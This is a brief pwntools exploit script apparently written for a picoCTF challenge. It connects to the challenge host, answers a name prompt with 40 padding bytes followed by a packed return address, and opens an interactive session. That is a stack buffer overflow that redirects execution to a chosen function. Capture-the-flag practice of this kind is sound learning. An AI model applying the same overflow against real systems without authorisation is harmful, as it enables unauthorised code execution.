from pwn import *

HOST, PORT = "mysterious-sea.picoctf.net", 60155
# HOST, PORT = "127.0.0.1", 31337
r = remote(HOST, PORT)

r.recvuntil(b'name: ')
r.sendline(b'A' * 40 + p64(0x401256))
r.interactive()